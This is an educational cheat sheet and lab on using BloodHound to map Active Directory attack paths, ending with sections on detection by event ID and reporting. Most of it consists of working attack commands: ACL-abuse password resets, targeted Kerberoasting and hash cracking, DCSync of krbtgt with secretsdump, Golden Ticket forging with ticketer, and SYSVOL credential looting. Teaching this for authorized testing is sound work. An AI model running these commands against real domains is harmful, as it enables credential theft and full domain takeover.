# BloodHound Attack Path Analysis

> **⚠️ AUTHORIZED USE ONLY.** For education and authorized testing only. These techniques map and exploit real trust relationships and forge domain credentials. Run them only against a lab you built or a domain explicitly in scope for an authorized engagement. Golden Tickets and DCSync are among the most serious actions possible in a domain; the lab here targets a Windows Server VM you control. See the [Legal and Terms of Use](/legal) page.

> "What took hours of tracing permission chains by hand, BloodHound shows as the shortest path to Domain Admin in seconds."

**Scope:** Using BloodHound to find and exploit attack paths in Active Directory. Collection, reading the graph, ACL abuse (GenericAll and friends), and chaining misconfigurations from a low-privileged user to Golden Ticket and full domain compromise. Assumes **AD Fundamentals** for the concepts and **AD Enumeration and Credential Abuse** for Kerberoasting, AS-REP Roasting, and DCSync, which this sheet uses as links in a chain rather than re-explaining.

**Recommended background:** the two AD sheets above, and comfort with impacket and hashcat.

## Table of Contents
- [What BloodHound Does](#what-bloodhound-does)
- [Setup](#setup)
- [Collection](#collection)
- [Reading the Graph](#reading-the-graph)
- [The Pre-Built Queries](#the-pre-built-queries)
- [Cypher for Custom Questions](#cypher-for-custom-questions)
- [Understanding Edges](#understanding-edges)
- [ACL Abuse: GenericAll and Friends](#acl-abuse-genericall-and-friends)
- [Chaining a Path](#chaining-a-path)
- [DCSync from a Discovered Path](#dcsync-from-a-discovered-path)
- [Golden Tickets](#golden-tickets)
- [SYSVOL and SMB Leakage](#sysvol-and-smb-leakage)
- [Lab: Low-Privilege User to Golden Ticket](#lab-low-privilege-user-to-golden-ticket)
- [Detection by Event ID](#detection-by-event-id)
- [Reporting an Attack Path](#reporting-an-attack-path)
- [Fast Recall](#fast-recall)
- [Resources](#resources)

## 1. What BloodHound Does

Active Directory permissions form a graph. A user is in a group, the group has rights over another object, that object can reset a third account's password, and that account is a Domain Admin. Tracing those chains by hand across hundreds of objects is slow and error-prone. BloodHound turns the whole domain into a graph database and answers one question instantly: **what is the shortest path from where I am to Domain Admin?**

| Part | Role |
|------|------|
| **Collector** | Gathers every object, property, and relationship from the domain (SharpHound on Windows, bloodhound-python on Linux) |
| **Database** | Stores it as a graph in Neo4j |
| **GUI** | Visualizes nodes and edges, runs queries, marks targets |

**Why this changed AD security:** a misconfiguration that is invisible in any single object's permission list becomes obvious as an edge in a graph. The nested-group problem from the Fundamentals sheet, a user three levels deep inheriting admin, is exactly what BloodHound surfaces at a glance. It made attack paths that were theoretically findable actually findable, for attackers and defenders alike.

**Nodes and edges** are the whole model:

- **Nodes** are objects: users, groups, computers, OUs, GPOs, domains.
- **Edges** are relationships: `MemberOf`, `GenericAll`, `AdminTo`, `CanRDP`, `HasSession`.

An attack path is a chain of edges from your starting node to a high-value target.

## 2. Setup

BloodHound Community Edition (CE) is the current version. It runs in Docker.

```bash
# BloodHound CE via Docker Compose
curl -L https://ghst.ly/getbhce -o docker-compose.yml
docker compose up -d
# then open http://localhost:8080 and log in
# (the initial password is printed in the container logs on first run)
docker compose logs bloodhound | grep -i "password"
```

The Linux collector:

```bash
pipx install bloodhound-ce         # the CE-compatible collector
# command: bloodhound-python
```

Standard AD tooling prerequisites, from the earlier sheets, because Kerberos will fail without them:

```bash
echo "nameserver <DC_IP>" | sudo tee /etc/resolv.conf
sudo ntpdate <DC_IP>
```

Variables:

```bash
export DC=10.0.0.10
export DOMAIN=pentestlab.local
export USER=intern
export PASS='<the onboarding password>'
```

## 3. Collection

Collection is the first step and the one people underestimate: the graph is only as good as what you collect. `-c All` gathers everything, which is what you want.

From Kali:

```bash
bloodhound-python -u $USER -p "$PASS" -d $DOMAIN -dc $DC -c All -ns $DC --zip
```

| Flag | Meaning |
|------|---------|
| `-u` / `-p` | Credentials for the collection |
| `-d` | The domain |
| `-dc` | The domain controller |
| `-c All` | Collect every method: sessions, ACLs, group membership, trusts, and more |
| `-ns` | Name server, point DNS at the DC |
| `--zip` | Bundle the JSON into one file for import |

From a Windows host, **SharpHound** is the native collector and gathers session data more completely:

```powershell
# SharpHound.exe or the PowerShell module
Invoke-BloodHound -CollectionMethod All -Domain pentestlab.local -ZipFileName loot.zip
```

**Import** the resulting ZIP through the GUI's upload button. The graph populates once it finishes ingesting.

**What each collection method gathers, and why session data matters:**

| Method | Collects |
|--------|----------|
| `Group` | Group memberships |
| `ACL` | Permission edges (`GenericAll`, `WriteDacl`, and so on) |
| `Session` | Who is logged in where, a key to lateral movement |
| `Trusts` | Domain trust relationships |
| `LocalAdmin` | Who is local admin on which machine |

Session data is time-sensitive: it captures who was logged on *at collection time*. Collecting more than once, and at different times, builds a fuller picture of where privileged users have active sessions, which is where you want to land.

## 4. Reading the Graph

Once data is imported, the GUI is where the analysis happens.

**The core workflow:**

1. **Mark your starting node.** Search for your user, right-click, "Mark as Owned". BloodHound now knows where you start.
2. **Mark or use built-in high-value targets.** Domain Admins and similar are flagged as high-value automatically.
3. **Ask for a path.** Use "Shortest Path from Owned" or the path-finding search between two nodes.
4. **Read the edges.** Each edge on the returned path is one action you must perform. Right-clicking an edge shows exactly how to abuse it.

**The single most valuable feature: right-click any edge, and BloodHound gives you the abuse instructions**, the exact commands or steps to exploit that relationship. The graph does not just tell you a path exists, it tells you how to walk it.

**Node info panel:** clicking any node shows its properties (the attributes from the enumeration sheet), its group memberships, its inbound and outbound control, and its sessions. This is also where a value hidden in an unusual property appears, since collection gathered the full property set.

## 5. The Pre-Built Queries

BloodHound ships analysis queries that answer common questions without writing anything. The ones you reach for first:

| Query | Answers |
|-------|---------|
| **Find all Domain Admins** | Who is effectively Domain Admin, through nesting |
| **Shortest Paths to Domain Admins** | The quickest route to full control |
| **Shortest Path from Owned Principals** | From your foothold to anywhere valuable |
| **Find Principals with DCSync Rights** | Who can pull all hashes (the endgame) |
| **Find Kerberoastable Accounts** | Accounts with an SPN |
| **Find AS-REP Roastable Accounts** | Pre-auth-disabled accounts |
| **Find Computers where Domain Users are Local Admin** | Over-broad local admin, easy lateral movement |
| **Find Workstations where Domain Users can RDP** | Reachable machines |

Running "Shortest Path from Owned Principals" after marking your user is often the entire analysis: it draws the chain of edges from your intern account to Domain Admin, and each edge is a step to execute.

## 6. Cypher for Custom Questions

When the pre-built queries do not ask exactly what you need, BloodHound's query console takes **Cypher**, Neo4j's query language. You do not need to master it, but a few patterns are worth having.

```cypher
// every user with an SPN (Kerberoastable)
MATCH (u:User) WHERE u.hasspn=true RETURN u

// every user with pre-auth disabled (AS-REP roastable)
MATCH (u:User) WHERE u.dontreqpreauth=true RETURN u

// users whose description contains text (secrets hide here)
MATCH (u:User) WHERE u.description IS NOT NULL RETURN u.name, u.description

// who has GenericAll over the Domain Admins group
MATCH p=(n)-[:GenericAll]->(g:Group) WHERE g.name STARTS WITH "DOMAIN ADMINS" RETURN p

// shortest path from a specific user to Domain Admins
MATCH p=shortestPath((u:User {name:"INTERN@PENTESTLAB.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@PENTESTLAB.LOCAL"})) RETURN p

// every object your owned user can control directly
MATCH p=(u:User {name:"INTERN@PENTESTLAB.LOCAL"})-[r]->(n) RETURN p
```

| Pattern | Meaning |
|---------|---------|
| `MATCH (u:User)` | Find nodes of type User |
| `WHERE u.property=value` | Filter on a property |
| `-[:EdgeType]->` | Follow a specific relationship |
| `shortestPath(...)` | The shortest chain between two nodes |
| `[*1..]` | Any number of hops |
| `RETURN p` | Return the path for display |

The `description` query is the practical one: it surfaces the free-text field where administrators leave passwords, the same finding the enumeration sheet chased, here answered graph-wide in one query.

## 7. Understanding Edges

Every edge is an action. Knowing what each lets you do is what turns a graph into a plan.

| Edge | What it lets you do |
|------|---------------------|
| `MemberOf` | Inherit the group's rights (this is how nesting works) |
| `AdminTo` | You are local admin on that computer |
| `GenericAll` | **Full control** of the target: reset password, add SPN, everything |
| `GenericWrite` | Write most attributes: add an SPN to Kerberoast, or set a script |
| `WriteDacl` | Rewrite the target's permissions, granting yourself more |
| `WriteOwner` | Take ownership, then grant yourself full control |
| `ForceChangePassword` | Reset the target's password without knowing the old one |
| `AddMember` | Add yourself (or anyone) to that group |
| `AllExtendedRights` | Includes the DCSync rights when over a domain |
| `HasSession` | A user is logged into that machine; steal their token |
| `CanRDP` / `CanPSRemote` | Remote into that machine |
| `Owns` | You own the object, equivalent to full control |

**The abuse pattern for most control edges is the same:** if you have `GenericAll`, `GenericWrite`, `WriteDacl`, or `WriteOwner` over a user, you can make that user Kerberoastable (add an SPN), reset its password, or otherwise take it over. Over a group, you add yourself. Over a computer, you can often reach code execution. BloodHound's per-edge help gives the exact commands.

## 8. ACL Abuse: GenericAll and Friends

ACL abuse is the technique BloodHound made accessible, and `GenericAll` is the headline. It means **full control** over an object, and it is handed out by mistake constantly, a helpdesk group given control over user accounts, a delegation that grants too much.

### GenericAll over a user

Full control lets you take the account over. Two common routes:

```bash
# Route 1: reset their password (from Linux, via the target's controller creds)
net rpc password "targetuser" "NewPass123!" -U "$DOMAIN"/"$USER"%"$PASS" -S $DC

# Route 2: make them Kerberoastable by adding an SPN, then roast (targeted Kerberoasting)
# add an SPN to the account you control, request the ticket, remove the SPN
targetedKerberoast.py -d $DOMAIN -u $USER -p "$PASS" --request-user targetuser
```

**Targeted Kerberoasting** is the elegant one: with write access to a user, you temporarily give it an SPN, request its service ticket (a `$krb5tgs$` hash), crack it offline, and remove the SPN. You never changed the password, so it is quieter than a reset.

### GenericAll over a group

You add yourself to the group and inherit its rights:

```bash
net rpc group addmem "Target Group" "$USER" -U "$DOMAIN"/"$USER"%"$PASS" -S $DC
```

If the group is privileged, you are now privileged.

### WriteDacl and WriteOwner

These are one step removed: they let you *grant yourself* the rights you do not yet have.

- `WriteOwner`: take ownership of the object, then as owner grant yourself `GenericAll`, then abuse it.
- `WriteDacl`: directly write a new permission entry giving yourself `GenericAll`.

Both end where `GenericAll` starts. BloodHound often chains these automatically in a path: `WriteOwner` → `GenericAll` → `ForceChangePassword` is a common three-edge sequence it will draw for you.

## 9. Chaining a Path

The whole point of BloodHound is that individual abuses combine. A realistic path from a low-privileged foothold:

```text
INTERN  (your owned account)
  │ MemberOf
  ▼
IT-SUPPORT  (a group)
  │ GenericAll        ← the group can fully control the next account
  ▼
SVC-BACKUP  (a service account)
  │ (has replication rights)
  ▼
DCSync  →  all domain hashes, including krbtgt
  │
  ▼
GOLDEN TICKET  →  persistent Domain Admin
```

Each arrow is one action from the earlier sections:

1. `MemberOf` you already have.
2. `GenericAll` over `SVC-BACKUP`: reset its password or targeted-Kerberoast it (Section 8).
3. `SVC-BACKUP` holds DCSync rights: pull hashes (Section 10).
4. The `krbtgt` hash forges a Golden Ticket (Section 11).

BloodHound draws this whole chain from "Shortest Path from Owned". Your job is to execute each edge in order. **This is what the project means by chaining misconfigurations: no single one is fatal, but the chain is.**

## 10. DCSync from a Discovered Path

DCSync is covered in the Enumeration sheet; here the point is that **BloodHound tells you who can do it**, via the "Find Principals with DCSync Rights" query or a `DCSync` / `AllExtendedRights` edge to the domain node.

Once you control such an account, execute it exactly as before:

```bash
# every hash in the domain
secretsdump.py -dc-ip $DC "$DOMAIN/<controlled_acct>:<pass>@$DC" -just-dc

# the one hash you need for a Golden Ticket
secretsdump.py -dc-ip $DC "$DOMAIN/<controlled_acct>:<pass>@$DC" -just-dc-user krbtgt
```

The output line for `krbtgt` is what feeds the next section:

```text
krbtgt:502:aad3b435...:<the NT hash you need>:::
```

## 11. Golden Tickets

A **Golden Ticket** is a forged Kerberos Ticket Granting Ticket, made using the domain's `krbtgt` account hash. Because the DC trusts any TGT encrypted with the `krbtgt` key, a forged one is accepted as valid for **any user, with any privileges, for as long as you choose**.

**Why it is the ultimate persistence:** it does not depend on any account's password. Resetting the compromised admin's password does not stop it. Only rotating the `krbtgt` password **twice** invalidates existing Golden Tickets, and most organizations never do that.

You need three things, all obtained from DCSync:

| Ingredient | From |
|-----------|------|
| The `krbtgt` NT hash | `secretsdump -just-dc-user krbtgt` |
| The domain SID | enumeration, or the secretsdump output |
| A username to impersonate | usually `Administrator` |

Forging it with impacket:

```bash
# get the domain SID
lookupsid.py "$DOMAIN/$USER:$PASS@$DC" | grep "Domain SID"

# forge the ticket
ticketer.py -nthash <krbtgt_hash> -domain-sid <domain_SID> -domain $DOMAIN Administrator

# use it: point Kerberos at the forged ticket, then act as Administrator
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass "$DOMAIN/Administrator@$DC"
psexec.py -k -no-pass "$DOMAIN/Administrator@$DC"
```

`-k -no-pass` tells impacket to authenticate with the Kerberos ticket in `KRB5CCNAME` rather than a password. With the forged ticket loaded, you are Administrator everywhere.

**The forensic reality**, which the project asks you to understand: a Golden Ticket bypasses the normal authentication event trail, which is precisely why it is dangerous, and why the detection focus (Section 14) is on the anomalies it cannot avoid, such as tickets with impossible lifetimes or a TGS request with no preceding TGT.

## 12. SYSVOL and SMB Leakage

Not every path runs through ACLs. **SYSVOL**, a share on every DC replicated to all of them, holds Group Policy files that every domain user can read, and administrators sometimes store secrets in them.

```bash
# list shares, SYSVOL is always present
nxc smb $DC -u $USER -p $PASS --shares

# the classic: cpassword in Group Policy Preferences (an old, decryptable secret)
nxc smb $DC -u $USER -p $PASS -M gpp_password

# mount and search SYSVOL by hand
smbclient "//$DC/SYSVOL" -U "$DOMAIN/$USER%$PASS"
# then: recurse ON; prompt OFF; mget *
grep -rniE 'password|cpassword|pass|secret' ./sysvol_dump/
```

**The `cpassword` finding** is a classic: old Group Policy Preferences stored a password encrypted with a key Microsoft published, so anything found in a `Groups.xml` and similar is trivially decryptable. `gpp-decrypt` reverses it instantly. Any domain user can read SYSVOL, so this is a low-privilege win that needs no ACL abuse at all.

More broadly, **SMB shares across the domain** frequently hold credentials in scripts, config files, and spreadsheets:

```bash
# spider readable shares for interesting files
nxc smb $DC -u $USER -p $PASS -M spider_plus
```

## 13. Lab: Low-Privilege User to Golden Ticket

**What you are doing:** the full BloodHound-driven chain, from the intern account to a Golden Ticket, exactly as the project intends. **Targets the Windows Server DC you built for the AD series.**

**Time:** about 60 minutes. **Prerequisites:** the AD lab (Kali, Windows Server DC, Windows 11), BloodHound CE running, and the onboarding intern credentials.

### Step 1: Prepare and collect

```bash
export DC=<your DC IP>
export DOMAIN=pentestlab.local
export USER=intern
export PASS='<onboarding password>'

echo "nameserver $DC" | sudo tee /etc/resolv.conf
sudo ntpdate $DC

bloodhound-python -u $USER -p "$PASS" -d $DOMAIN -dc $DC -c All -ns $DC --zip
```

Import the ZIP into the BloodHound GUI.

### Step 2: Mark your foothold and find a path

In the GUI: search `INTERN`, right-click, **Mark as Owned**. Then run **Shortest Path from Owned Principals**.

Expected: a graph showing the chain of edges from `INTERN` to a high-value target. Read each edge, that is your to-do list.

### Step 3: Walk the first edge (ACL abuse)

Whatever the first control edge is, right-click it and read BloodHound's abuse instructions. If it is `GenericAll` over an account, targeted-Kerberoast it:

```bash
targetedKerberoast.py -d $DOMAIN -u $USER -p "$PASS" --request-user <target_account>
hashcat -m 13100 <output> /usr/share/wordlists/rockyou.txt
```

Expected: a cracked password for the next account in the path.

### Step 4: Check for DCSync rights

Run **Find Principals with DCSync Rights** in BloodHound, and confirm the account you just compromised is one of them (the path should already show this).

### Step 5: DCSync the krbtgt hash

```bash
secretsdump.py -dc-ip $DC "$DOMAIN/<compromised_acct>:<cracked_pass>@$DC" -just-dc-user krbtgt
```

Expected: the `krbtgt` NT hash. Note it.

### Step 6: Get the domain SID

```bash
lookupsid.py "$DOMAIN/<compromised_acct>:<cracked_pass>@$DC" | grep "Domain SID"
```

### Step 7: Forge the Golden Ticket

```bash
ticketer.py -nthash <krbtgt_hash> -domain-sid <domain_SID> -domain $DOMAIN Administrator
export KRB5CCNAME=Administrator.ccache
```

### Step 8: Prove domain compromise

```bash
psexec.py -k -no-pass "$DOMAIN/Administrator@$DC"
# or dump everything as Administrator
secretsdump.py -k -no-pass "$DOMAIN/Administrator@$DC" -just-dc
```

Expected: a SYSTEM shell on the DC, or a full hash dump, acting as Administrator via the forged ticket. That is full domain compromise, from the intern account.

### Step 9: Also check SYSVOL

Independently of the ACL path, confirm the low-privilege SYSVOL win:

```bash
nxc smb $DC -u $USER -p $PASS -M gpp_password
```

### Step 10: Trace the path for your report

Write down the chain you walked: intern → each edge → Golden Ticket. Section 15 covers turning this into a finding.

### Cleanup

Revert the DC to a snapshot. **A Golden Ticket persists until `krbtgt` is rotated twice**, so a snapshot revert is the clean way to reset the lab.

```bash
rm -f *.ccache *.zip *.json <roast output files>
```

## 14. Detection by Event ID

The project pairs offense with the defender's view. Each stage of the chain leaves Windows event traces.

| Stage | Event ID | What it shows |
|-------|----------|---------------|
| **BloodHound collection** | 4661, 4662 | Bulk directory and object access |
| **Kerberoasting** | 4769 | Service ticket requested, RC4 (type 0x17) is the tell |
| **AS-REP Roasting** | 4768 | AS-REQ with pre-auth type 0 |
| **Password spraying** | 4625 | Many accounts, one failed logon each |
| **ACL modification** | 4670, 5136 | Permissions on an object changed |
| **DCSync** | 4662 | Directory replication access from a non-DC, the key signal |
| **Golden Ticket use** | 4624, 4769 | Logon or ticket with anomalies (impossible lifetime, no prior 4768) |
| **Account created for persistence** | 4720 | New account |

**The highest-fidelity detections:**

- **DCSync from a non-DC (4662 with the replication GUID).** Only domain controllers should replicate. Anything else doing it is an attack.
- **A Golden Ticket's tell is inconsistency:** a TGS request (4769) with no preceding TGT request (4768), or a ticket whose lifetime exceeds the domain's Kerberos policy. The forged ticket cannot match a legitimate issuance trail.
- **RC4 Kerberos requests (4769, 0x17)** where the environment should be AES: the signature of Kerberoasting.

**PowerShell logging** (Script Block Logging, event 4104) and **Group Policy auditing** catch the on-host and configuration-change side of the chain, which is why the project pairs them with the event IDs.

## 15. Reporting an Attack Path

A BloodHound engagement's deliverable is the path, explained so a defender can break it.

**What a path finding contains:**

| Element | Content |
|---------|---------|
| **Title** | The outcome, e.g. "Domain compromise from a standard user via ACL abuse" |
| **Severity** | Critical, since it ends in Domain Admin |
| **Starting point** | The privilege level you began with (a low-priv user) |
| **The chain** | Each edge in order, with the specific object at each step |
| **Proof** | The commands run and evidence at each step, credentials redacted |
| **The break point** | Which single edge, if removed, breaks the whole chain most cheaply |
| **Remediation** | The specific fix for each abused edge |

**The break-point analysis is the valuable part.** A chain of five edges usually has one that is far cheaper to fix than the others, removing one over-broad `GenericAll`, for instance, may sever the only route to Domain Admin. Identifying that single fix is worth more to the client than listing all five abuses, because it tells them where to spend first.

A BloodHound screenshot of the path, annotated with what each edge is and how it was abused, communicates a chain to a non-specialist faster than any prose. Include it.

## 16. Fast Recall

- **BloodHound turns AD permissions into a graph** and finds the shortest path from your foothold to Domain Admin instantly. Nodes are objects, edges are relationships.
- **Collect with `-c All`.** The graph is only as good as the collection. Session data is time-sensitive, so collect more than once.
- **Mark your user as Owned, then run "Shortest Path from Owned Principals".** That single query is often the whole analysis.
- **Right-click any edge for the abuse instructions.** BloodHound tells you how to walk the path, not just that it exists.
- **Edges are actions:** `GenericAll` full control, `GenericWrite` add an SPN or script, `WriteDacl`/`WriteOwner` grant yourself control, `ForceChangePassword` reset, `AddMember` join a group, `DCSync`/`AllExtendedRights` pull hashes.
- **GenericAll over a user** means take it over: reset the password, or targeted-Kerberoast by adding a temporary SPN.
- **GenericAll over a group** means add yourself and inherit its rights.
- **WriteOwner → GenericAll → ForceChangePassword** is a common auto-chained sequence.
- **Cypher** answers custom questions. `u.hasspn=true` for Kerberoastable, `u.dontreqpreauth=true` for AS-REP, `u.description IS NOT NULL` for secrets in descriptions.
- **BloodHound finds who can DCSync;** then `secretsdump -just-dc-user krbtgt` pulls the hash you need.
- **A Golden Ticket** is forged from the `krbtgt` hash with `ticketer.py`, grants any user any privilege, and persists until `krbtgt` is rotated **twice**.
- **SYSVOL is readable by every domain user.** Check for GPP `cpassword` (`nxc -M gpp_password`), a trivially decryptable low-privilege win with no ACL abuse.
- **The chain is the attack:** no single misconfiguration is fatal, the sequence is. Fix the cheapest edge to break it.
- **Detection:** DCSync from a non-DC (4662 + replication GUID) and Golden Ticket inconsistencies (4769 with no prior 4768) are the highest-fidelity signals. RC4 requests (4769, 0x17) flag Kerberoasting.
- **Report the path and its break point:** the single edge whose removal severs the route to Domain Admin is the most valuable thing you give the client.

## 17. Resources

**BloodHound**
- [BloodHound Community Edition](https://github.com/SpecterOps/BloodHound)
- [BloodHound documentation](https://bloodhound.specterops.io/)
- [bloodhound-python collector](https://github.com/dirkjanm/BloodHound.py)
- [SharpHound collector](https://github.com/SpecterOps/SharpHound)
- [BloodHound Cypher query reference](https://bloodhound.specterops.io/analyze-data/bloodhound-gui/cypher-search)

**Attack techniques**
- [The Hacker Recipes: ACL abuse](https://www.thehacker.recipes/ad/movement/dacl/)
- [The Hacker Recipes: Kerberos (Golden Ticket)](https://www.thehacker.recipes/ad/persistence/kerberos)
- [HackTricks: AD methodology](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [MITRE ATT&CK: Golden Ticket (T1558.001)](https://attack.mitre.org/techniques/T1558/001/)
- [Impacket](https://github.com/fortra/impacket)

**Detection**
- [Microsoft: Audit events for AD](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/security-auditing-overview)
- [CISA: Detecting and mitigating AD compromises](https://www.cisa.gov/resources-tools/resources/detecting-and-mitigating-active-directory-compromises)
- [The DFIR Report (real intrusion write-ups with event IDs)](https://thedfirreport.com/)

**Related sheets**
- Active Directory Fundamentals, for the object model and ACL concepts
- Active Directory Enumeration and Credential Abuse, for Kerberoasting, AS-REP, and DCSync
- Active Directory Directory Enumeration, for the LDAP and RPC channels BloodHound complements

**Practice**
- [GOAD: Game of Active Directory](https://github.com/Orange-Cyberdefense/GOAD)
- [TryHackMe: BloodHound](https://tryhackme.com/)
